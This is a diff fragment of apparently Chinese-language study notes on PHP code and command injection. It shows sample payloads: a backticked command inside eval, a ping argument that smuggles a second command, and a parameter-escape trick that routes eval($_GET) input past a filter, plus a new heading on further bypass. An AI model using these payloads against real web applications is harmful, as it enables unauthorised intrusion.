@@ -36,5 +36,7 @@ eval("echo `ifconfig`;");
         ping '127.0.0.1';ls #'
 
 参数逃逸：通过创造新变量并在检测之后赋值来逃脱匹配
-    ?c=eval($GET[x]);&x=phpinfo();
+1.  ?c=eval($GET[x]);&x=phpinfo();
     eval($_GET['c'])
+2.  进行进一步加密绕过
+
